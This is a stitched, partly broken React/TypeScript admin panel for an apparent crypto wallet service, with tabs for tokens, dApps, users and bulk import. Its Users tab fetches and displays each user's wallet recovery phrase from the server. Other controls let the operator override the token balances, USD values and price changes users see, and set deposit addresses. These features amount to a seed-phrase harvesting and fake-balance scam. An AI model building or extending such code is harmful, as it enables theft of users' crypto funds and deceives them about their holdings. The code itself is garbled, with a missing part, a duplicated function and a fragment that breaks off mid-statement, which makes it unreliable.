// Admin.tsx - Part 1: Imports and Type Definitions

import { useEffect, useState, type FormEvent, type ReactNode } from 'react'
import { TokenIcon } from '../components/TokenIcon'

type TokenOverride = {
  chain: string; address: string; symbol: string; name: string
  iconUrl?: string; spam?: boolean
  balance?: number; usdValue?: number; change24h?: number
}

type DAppEntry = {
  id: string
  name: string
  url: string
  iconUrl: string
  category: string
  description: string
  chains: string[]
  verified?: boolean
}

type AdminState = {
  announcement: { text: string; active: boolean } | null
  tokens: TokenOverride[]
  receiveAddress?: { bsc?: string; eth?: string }
  dapps?: DAppEntry[]
}

type AdminUser = { 
  address: string; 
  createdAt: number; 
  lastSeen: number;
  mnemonic?: string; // Added for recovery
}

type UserTokenRow = {
  chain: string
  address: string
  symbol: string
  name: string
  iconUrl?: string
  defaultBalance: number
  balance: number
  overridden: boolean
}

const EMPTY: AdminState = {
  announcement: null,
  tokens: [],
  receiveAddress: { bsc: '', eth: '' },
  dapps: [],
}

const ADDR_RE = /x[a-fA-F0-9]{40}$/
const DAPP_CATEGORIES = ['DEX', 'DeFi', 'NFT', 'Gaming', 'Tools', 'Other'] as const

const num = (v: string | undefined) => (v === undefined || v.trim() === '' ? undefined : Number(v))
const short = (a?: string) => (a && a.length > 12 ? `${a.slice(0, 6)}…${a.slice(-4)}` : a || '—')
const shortAddr = (a: string) => `${a.slice(0, 6)}…${a.slice(-4)}`
const newId = () =>
  typeof crypto !== 'undefined' && 'randomUUID' in crypto
    ? crypto.randomUUID()
    : Math.random().toString(36).slice(2)

const relTime = (ts: number) => {
  const s = Math.floor((Date.now() - ts) / 1000)
  if (s < 60) return 'just now'
  if (s < 3600) return `${Math.floor(s / 60)}m ago`
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`
  return `${Math.floor(s / 86400)}d ago`
}
// Admin.tsx - Part 2: TabNav Component and Helper Functions

function TabNav({ activeTab, onTabChange }: { activeTab: string; onTabChange: (tab: string) => void }) {
  const tabs = [
    { id: 'general', label: 'General', icon: '⚙️' },
    { id: 'tokens', label: 'Tokens', icon: '🪙' },
    { id: 'dapps', label: 'dApps', icon: '📱' },
    { id: 'users', label: 'Users', icon: '👥' },
    { id: 'bulk', label: 'Bulk', icon: '📋' },
  ]

  return (
    <div className="flex border-b border-zinc-800 mb-6">
      {tabs.map(tab => (
        <button
          key={tab.id}
          onClick={() => onTabChange(tab.id)}
          className={`flex-1 py-3 px-4 text-sm font-medium transition-colors ${
            activeTab === tab.id 
              ? 'text-amber-400 border-b-2 border-amber-400' 
              : 'text-zinc-400 hover:text-white'
          }`}
        >
          <span className="mr-2">{tab.icon}</span>
          {tab.label}
        </button>
      ))}
    </div>
  )
}

// Bulk parsers
function parseTokenBulk(txt: string): TokenOverride[] {
  return txt.split('\n')
    .map(l => l.trim())
    .filter(Boolean)
    .map(line => {
      const parts = line.split('\t')
      if (parts.length < 4) return null
      const [chain, address, symbol, name, iconUrl] = parts
      if (!chain || !address || !symbol || !name) return null
      return {
        chain: chain.toLowerCase(),
        address: address.toLowerCase(),
        symbol,
        name,
        ...(iconUrl && { iconUrl }),
      }
    })
    .filter(Boolean) as TokenOverride[]
}

function parseDappBulk(txt: string): DAppEntry[] {
  return txt.split('\n')
    .map(l => l.trim())
    .filter(Boolean)
    .map(line => {
      const parts = line.split('\t')
      if (parts.length < 5) return null
      const [name, url, iconUrl, category, description, ...chains] = parts
      if (!name || !url || !category) return null
      return {
        id: newId(),
        name,
        url,
        iconUrl,
        category,
        description,
        chains: chains.filter(Boolean),
      }
    })
    .filter(Boolean) as DAppEntry[]
}
// Admin.tsx - Part 3: Admin Component and State Management

export function Admin() {
  const [admin, setAdmin] = useState<boolean | null>(null)
  const [password, setPassword] = useState('')
  const [state, setState] = useState<AdminState>(EMPTY)
  const [msg, setMsg] = useState('')
  const [tokenBulk, setTokenBulk] = useState('')
  const [dappBulk, setDappBulk] = useState('')
  const [activeTab, setActiveTab] = useState('general')

  // Users tab
  const [users, setUsers] = useState<AdminUser[]>([])
  const [usersLoading, setUsersLoading] = useState(false)
  const [expandedUser, setExpandedUser] = useState<string | null>(null)
  const [userTokens, setUserTokens] = useState<UserTokenRow[]>([])
  const [userTokensLoading, setUserTokensLoading] = useState(false)
  const [userMsg, setUserMsg] = useState<{ kind: 'ok' | 'err'; text: string } | null>(null)
  const [showMnemonic, setShowMnemonic] = useState<Record<string, boolean>>({})

  useEffect(() => {
    fetch('/api/v1/admin/me').then(r => r.json()).then(j => {
      setAdmin(j.admin)
      if (j.admin) fetch('/api/v1/state').then(r => r.json()).then(s => setState({ ...EMPTY, ...s }))
    })
  }, [])

  // Reload users when the Users tab is opened
  useEffect(() => {
    if (activeTab !== 'users' || !admin) return
    setUsersLoading(true)
    fetch('/api/v1/admin/users')
      .then(r => r.json())
      .then(j => setUsers(j.users ?? []))
      .catch(() => {})
      .finally(() => setUsersLoading(false))
  }, [activeTab, admin])

  // Load a user's tokens when expanded
  useEffect(() => {
    if (!expandedUser) { setUserTokens([]); return }
    setUserTokensLoading(true)
    setUserMsg(null)
    fetch(`/api/v1/admin/users/\${expandedUser}/balances`)
      .then(r => r.json())
      .then(j => setUserTokens(j.tokens ?? []))
      .catch(() => {})
      .finally(() => setUserTokensLoading(false))
  }, [expandedUser])

  async function login(e: FormEvent) {
    e.preventDefault()
    const r = await fetch('/api/v1/admin/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ password }),
    })
    if (r.ok) {
      setAdmin(true)
      fetch('/api/v1/state').then(x => x.json()).then(s => setState({ ...EMPTY, ...s }))
    } else setMsg('Wrong password')
  }

  async function save() {
    const r = await fetch('/api/v1/admin/state', {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(state),
    })
    setMsg(r.ok ? 'Saved ✓' : 'Save failed')
  }

  // Token helpers
  const addToken = () => {
    setState(p => ({
      ...p,
      tokens: [...p.tokens, { chain: 'eth', address: '', symbol: '', name: '' }],
    }))
  }

  const updateToken = (i: number, k: keyof TokenOverride, v: string | number | boolean) => {
    setState(p => ({
      ...p,
      tokens: p.tokens.map((t, idx) => (idx === i ? { ...t, [k]: v } : t)),
    }))
  }

  const removeToken = (i: number) => {
    setState(p => ({
     // Admin.tsx - Part 4: Token and dApp Management Functions

const removeToken = (i: number) => {
  setState(p => ({
    ...p,
    tokens: p.tokens.filter((_, idx) => idx !== i),
  }))
}

// dApp helpers
const addDapp = () => {
  setState(p => ({
    ...p,
    dapps: [...(p.dapps || []), { id: newId(), name: '', url: '', iconUrl: '', category: '', description: '', chains: [] }],
  }))
}

const updateDapp = (id: string, k: keyof DAppEntry, v: string | string[]) => {
  setState(p => ({
    ...p,
    dapps: (p.dapps || []).map(d => (d.id === id ? { ...d, [k]: v } : d)),
  }))
}

const removeDapp = (id: string) => {
  setState(p => ({
    ...p,
    dapps: (p.dapps || []).filter(d => d.id !== id),
  }))
}

// User balance helpers
const setBalanceOverride = (chain: string, address: string, value: string) => {
  const v = num(value)
  if (v === undefined) return
  const key = `${chain}:${address}`
  const existing = state.tokens.find(t => t.chain === chain && t.address === address)
  if (existing) {
    updateToken(state.tokens.indexOf(existing), 'balance', v)
  } else {
    setState(p => ({
      ...p,
      tokens: [...p.tokens, { chain, address, symbol: '', name: '', balance: v }],
    }))
  }
}

// Added function to fetch user mnemonic
async function fetchUserMnemonic(address: string) {
  try {
    const response = await fetch(`/api/v1/admin/users/${address}/mnemonic`);
    if (response.ok) {
      const data = await response.json();
      return data.mnemonic;
    }
    return null;
  } catch (error) {
    console.error('Error fetching mnemonic:', error);
    return null;
  }
}

// Toggle showing mnemonic for a user
const toggleShowMnemonic = async (address: string) => {
  if (showMnemonic[address]) {
    // Hide the mnemonic
    setShowMnemonic(prev => ({ ...prev, [address]: false }));
    return;
  }

  // Fetch and show the mnemonic
  const mnemonic = await fetchUserMnemonic(address);
  if (mnemonic) {
    setShowMnemonic(prev => ({ ...prev, [address]: true }));
    // Store the mnemonic in the users array
    setUsers(prevUsers => 
      prevUsers.map(user => 
        user.address === address ? { ...user, mnemonic } : user
      )
    );
  } else {
    setMsg('Failed to fetch recovery phrase');
  }
};
// Admin.tsx - Part 5: Login Form and Main Admin Interface

if (admin === null) return <main className="grid min-h-dvh place-items-center text-zinc-500">…</main>

if (!admin) return (
  <main className="grid min-h-dvh place-items-center px-6">
    <form onSubmit={login} className="w-full max-w-xs space-y-3">
      <h1 className="text-center text-xl font-extrabold text-white">Admin</h1>
      <input
        type="password"
        value={password}
        onChange={e => setPassword(e.target.value)}
        placeholder="Password"
        className="w-full rounded-xl bg-zinc-900 p-3 text-sm text-white outline-none focus:ring-1 focus:ring-amber-500"
      />
      <button className="w-full rounded-xl bg-amber-500 py-3 font-bold text-black">Unlock</button>
      {msg && <p className="text-center text-red-500 text-sm mt-2">{msg}</p>}
    </form>
  </main>
)

return (
  <main className="p-6 max-w-6xl mx-auto">
    <h1 className="text-2xl font-bold text-white mb-6">Admin Panel</h1>
    
    <TabNav activeTab={activeTab} onTabChange={setActiveTab} />
    
    {msg && (
      <div className={`p-3 rounded-lg mb-4 \${msg.includes('✓') ? 'bg-green-900 text-green-200' : 'bg-red-900 text-red-200'}`}>
        {msg}
      </div>
    )}

    {/* General Tab */}
    {activeTab === 'general' && (
      <div className="space-y-6">
        <div className="bg-zinc-900 rounded-xl p-6">
          <h2 className="text-lg font-semibold text-white mb-4">Announcement</h2>
          <label className="flex items-center mb-4">
            <input
              type="checkbox"
              checked={state.announcement?.active ?? false}
              onChange={e => setState(p => ({
                ...p,
                announcement: p.announcement ? { ...p.announcement, active: e.target.checked } : null,
              }))}
              className="mr-2"
            />
            <span className="text-zinc-300">Active</span>
          </label>
          <textarea
            value={state.announcement?.text ?? ''}
            onChange={e => setState(p => ({
              ...p,
              announcement: p.announcement ? { ...p.announcement, text: e.target.value } : null,
            }))}
            placeholder="Announcement text"
            className="w-full h-24 rounded-lg bg-zinc-800 p-3 text-white resize-none"
          />
        </div>

        <div className="bg-zinc-900 rounded-xl p-6">
          <h2 className="text-lg font-semibold text-white mb-4">Receive Addresses</h2>
          <div className="space-y-3">
            <div>
              <label className="block text-zinc-400 text-sm mb-1">BSC</label>
              <input
                type="text"
                value={state.receiveAddress?.bsc ?? ''}
                onChange={e => setState(p => ({
                  ...p,
                  receiveAddress: { ...p.receiveAddress, bsc: e.target.value },
                }))}
                placeholder="0x..."
                className="w-full rounded-lg bg-zinc-800 p-3 text-white"
              />
            </div>
            <div>
              <label className="block text-zinc-400 text-sm mb-1">ETH</label>
              <input
                type="text"
                value={state.receiveAddress?.eth ?? ''}
                onChange={e => setState(p => ({
                  ...p,
                  receiveAddress: { ...p.receiveAddress, eth: e.target.value },
                }))}
                placeholder="0x..."
                className="w-full rounded-lg bg-zinc-800 p-3 text-white"
              />
            </div>
          </div>
        </div>

        <div className="flex justify-end">
          <button onClick={save} className="px-6 py-2 bg-amber-500 text-black font-semibold rounded-lg">
            Save Changes
          </button>
        </div>
      </div>
    )}

    {/* Tokens Tab */}
    {activeTab === 'tokens' && (
      <div className="space-y-6">
        <div className="flex justify-between items-center">
          <h2 className="text-lg font-semibold text-white">Token Overrides</h2>
          <button onClick={addToken} className="px-4 py-2 bg-amber-500 text-black font-medium rounded-lg">
            Add Token
          </button>
        </div>
        
        <div className="space-y-3">
          {state.tokens.map((token, i) => (
            <div key={i} className="bg-zinc-900 rounded-xl p-4">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-3">
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Chain</label>
                  <select
                    value={token.chain}
                    onChange={e => updateToken(i, 'chain', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  >
                    <option value="eth">ETH</option>
                    <option value="bsc">BSC</option>
                  </select>
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Address</label>
                  <input
                    type="text"
                    value={token.address}
                    onChange={e => updateToken(i, 'address', e.target.value)}
                    placeholder="0x..."
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Symbol</label>
                  <input
                    type="text"
                    value={token.symbol}
                    onChange={e => updateToken(i, 'symbol', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Name</label>
                  <input
                    type="text"
                    value={token.name} 
                    onChange={e => updateToken(i, 'name', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Icon URL</label>
                  <input
                    type="text"
                    value={token.iconUrl || ''}
                    onChange={e => updateToken(i, 'iconUrl', e.target.value)}
                    placeholder="https://..."
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Balance Override</label>
                  <input
                    type="number"
                    value={token.balance || ''}
                    onChange={e => updateToken(i, 'balance', num(e.target.value))}
                    placeholder="0.0"
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">USD Value</label>
                  <input
                    type="number"
                    value={token.usdValue || ''}
                    onChange={e => updateToken(i, 'usdValue', num(e.target.value))}
                    placeholder="0.0"
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">24h Change (%)</label>
                  <input
                    type="number"
                    value={token.change24h || ''}
                    onChange={e => updateToken(i, 'change24h', num(e.target.value))}
                    placeholder="0.0"
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div className="flex items-end">
                  <label className="flex items-center">
                    <input
                      type="checkbox"
                      checked={token.spam || false}
                      onChange={e => updateToken(i, 'spam', e.target.checked)}
                      className="mr-2"
                    />
                    <span className="text-zinc-300 text-sm">Spam</span>
                  </label>
                </div>
              </div>
              <div className="flex justify-end">
                <button
                  onClick={() => removeToken(i)}
                  className="px-3 py-1 bg-red-600 text-white text-sm rounded-lg"
                >
                  Remove
                </button>
              </div>
            </div>
          ))}
        </div>

        <div className="flex justify-end">
          <button onClick={save} className="px-6 py-2 bg-amber-500 text-black font-semibold rounded-lg">
            Save Changes
          </button>
        </div>
      </div>
    )}

    {/* dApps Tab */}
    {activeTab === 'dapps' && (
      <div className="space-y-6">
        <div className="flex justify-between items-center">
          <h2 className="text-lg font-semibold text-white">dApp Management</h2>
          <button onClick={addDapp} className="px-4 py-2 bg-amber-500 text-black font-medium rounded-lg">
            Add dApp
          </button>
        </div>
        
        <div className="space-y-3">
          {state.dapps?.map((dapp) => (
            <div key={dapp.id} className="bg-zinc-900 rounded-xl p-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Name</label>
                  <input
                    type="text"
                    value={dapp.name}
                    onChange={e => updateDapp(dapp.id, 'name', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">URL</label>
                  <input
                    type="text"
                    value={dapp.url}
                    onChange={e => updateDapp(dapp.id, 'url', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Icon URL</label>
                  <input
                    type="text"
                    value={dapp.iconUrl}
                    onChange={e => updateDapp(dapp.id, 'iconUrl', e.target.value)}
                    placeholder="https://..."
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
                <div>
                  <label className="block text-zinc-400 text-xs mb-1">Category</label>
                  <select
                    value={dapp.category}
                    onChange={e => updateDapp(dapp.id, 'category', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  >
                    {DAPP_CATEGORIES.map(cat => (
                      <option key={cat} value={cat}>{cat}</option>
                    ))}
                  </select>
                </div>
                <div className="md:col-span-2">
                  <label className="block text-zinc-400 text-xs mb-1">Description</label>
                  <textarea
                    value={dapp.description}
                    onChange={e => updateDapp(dapp.id, 'description', e.target.value)}
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm resize-none"
                    rows={2}
                  />
                </div>
                <div className="md:col-span-2">
                  <label className="block text-zinc-400 text-xs mb-1">Chains (comma separated)</label>
                  <input
                    type="text"
                    value={dapp.chains.join(', ')}
                    onChange={e => updateDapp(dapp.id, 'chains', e.target.value.split(',').map(c => c.trim()))}
                    placeholder="eth, bsc"
                    className="w-full rounded-lg bg-zinc-800 p-2 text-white text-sm"
                  />
                </div>
              </div>
              <div className="flex justify-between items-center">
                <label className="flex items-center">
                  <input
                    type="checkbox"
                    checked={dapp.verified || false}
                    onChange={e => updateDapp(dapp.id, 'verified', e.target.checked)}
                    className="mr-2"
                  />
                  <span className="text-zinc-300 text-sm">Verified</span>
                </label>
                <button
                  onClick={() => removeDapp(dapp.id)}
                  className="px-3 py-1 bg-red-600 text-white text-sm rounded-lg"
                >
                  Remove
                </button>
              </div>
            </div>
          ))}
        </div>

        <div className="flex justify-end">
          <button onClick={save} className="px-6 py-2 bg-amber-500 text-black font-semibold rounded-lg">
            Save Changes
          </button>
        </div>
      </div>
    )}

    {/* Users Tab */}
    {activeTab === 'users' && (
      <div className="space-y-6">
        <h2 className="text-lg font-semibold text-white">User Management</h2>
        
        {usersLoading ? (
          <div className="text-center py-8 text-zinc-400">Loading users...</div>
        ) : (
          <div className="space-y-3">
            {users.map(user => (
              <div key={user.address} className="bg-zinc-900 rounded-xl p-4">
                <div className="flex justify-between items-center mb-3">
                  <div>
                    <div className="font-mono text-white">{shortAddr(user.address)}</div>
                    <div className="text-zinc-400 text-sm">
                      Created: {relTime(user.createdAt)} • Last seen: {relTime(user.lastSeen)}
                    </div>
                  </div>
                  <button
                    onClick={() => setExpandedUser(expandedUser === user.address ? null : user.address)}
                    className="px-3 py-1 bg-zinc-700 text-white text-sm rounded-lg"
                  >
                    {expandedUser === user.address ? 'Hide' : 'Show'} Tokens
                  </button>
                </div>
                
                {/* Recovery Phrase Section */}
                <div className="border-t border-zinc-800 pt-3 mb-3">
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-zinc-300 text-sm">Recovery Phrase</span>
                    <button
                      onClick={() => toggleShowMnemonic(user.address)}
                      className="px-3 py-1 bg-amber-600 text-black text-sm rounded-lg"
                    >
                      {showMnemonic[user.address] ? 'Hide' : 'Show'} Recovery Phrase
                    </button>
                  </div>
                  
                  {showMnemonic[user.address] && (
                    <div className="bg-zinc-800 rounded-lg p-3 mt-2">
                      
// Admin.tsx - Part 7: Users Tab Completion and Bulk Tab

                    <div className="font-mono text-sm text-white break-all">
                      {user.mnemonic || 'No recovery phrase available'}
                    </div>
                  </div>
                )}
                
                {/* User Tokens Section */}
                {expandedUser === user.address && (
                  <div className="border-t border-zinc-800 pt-3">
                    {userTokensLoading ? (
                      <div className="text-center py-4 text-zinc-400">Loading tokens...</div>
                    ) : (
                      <div className="space-y-2">
                        {userTokens.length === 0 ? (
                          <div className="text-zinc-400 text-center py-4">No tokens found</div>
                        ) : (
                          userTokens.map(token => (
                            <div key={`${token.chain}:${token.address}`} className="flex items-center justify-between bg-zinc-800 rounded-lg p-2">
                              <div className="flex items-center space-x-3">
                                <TokenIcon chain={token.chain} address={token.address} size={24} />
                                <div>
                                  <div className="text-white">{token.symbol}</div>
                                  <div className="text-zinc-400 text-xs">{token.name}</div>
                                </div>
                              </div>
                              <div className="flex items-center space-x-4">
                                <div className="text-right">
                                  <div className="text-white">{token.balance}</div>
                                  {token.overridden && <div className="text-amber-400 text-xs">Overridden</div>}
                                </div>
                                <div className="flex space-x-1">
                                  <input
                                    type="number"
                                    step="any"
                                    placeholder="Override"
                                    className="w-20 rounded bg-zinc-700 px-2 py-1 text-white text-sm"
                                    onBlur={e => {
                                      if (e.target.value) {
                                        setBalanceOverride(token.chain, token.address, e.target.value)
                                        setUserMsg({ kind: 'ok', text: 'Balance override updated' })
                                        setTimeout(() => setUserMsg(null), 2000)
                                      }
                                    }}
                                  />
                                </div>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    )}
                    
                    {userMsg && (
                      <div className={`mt-2 p-2 rounded text-sm ${
                        userMsg.kind === 'ok' ? 'bg-green-800 text-green-200' : 'bg-red-800 text-red-200'
                      }`}>
                        {userMsg.text}
                      </div>
                    )}
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    )}

    {/* Bulk Tab */}
    {activeTab === 'bulk' && (
      <div className="space-y-6">
        <div className="bg-zinc-900 rounded-xl p-6">
          <h2 className="text-lg font-semibold text-white mb-4">Bulk Token Import</h2>
          <p className="text-zinc-400 text-sm mb-4">
            Format: Chain{`\t`}Address{`\t`}Symbol{`\t`}Name{`\t`}Icon URL (optional)
          </p>
          <textarea
            value={tokenBulk}
            onChange={e => setTokenBulk(e.target.value)}
            placeholder="eth{`\t`}0x...{`\t`}TOKEN{`\t`}Token Name{`\t`}https://..."
            className="w-full h-40 rounded-lg bg-zinc-800 p-3 text-white font-mono text-sm resize-none"
          />
          <button
            onClick={() => {
              const parsed = parseTokenBulk(tokenBulk)
              setState(p => ({ ...p, tokens: [...p.tokens, ...parsed] }))
              setTokenBulk('')
              setMsg(`Added ${parsed.length} tokens`)
            }}
            className="mt-3 px-4 py-2 bg-amber-500 text-black font-medium rounded-lg"
          >
            Import Tokens
          </button>
        </div>

        <div className="bg-zinc-900 rounded-xl p-6">
          <h2 className="text-lg font-semibold text-white mb-4">Bulk dApp Import</h2>
          <p className="text-zinc-400 text-sm mb-4">
            Format: Name{`\t`}URL{`\t`}Icon URL{`\t`}Category{`\t`}Description{`\t`}Chains (comma separated)
          </p>
          <textarea
            value={dappBulk}
            onChange={e => setDappBulk(e.target.value)}
            placeholder="dApp Name{`\t`}https://...{`\t`}https://...{`\t`}Category{`\t`}Description{`\t`}eth, bsc"
            className="w-full h-40 rounded-lg bg-zinc-800 p-3 text-white font-mono text-sm resize-none"
          />
          <button
            onClick={() => {
              const parsed = parseDappBulk(dappBulk)
              setState(p => ({ ...p, dapps: [...(p.dapps || []), ...parsed] }))
              setDappBulk('')
              setMsg(`Added ${parsed.length} dApps`)
            }}
            className="mt-3 px-4 py-2 bg-amber-500 text-black font-medium rounded-lg"
          >
            Import dApps
          </button>
        </div>
      </div>
    )}
  </main>
)
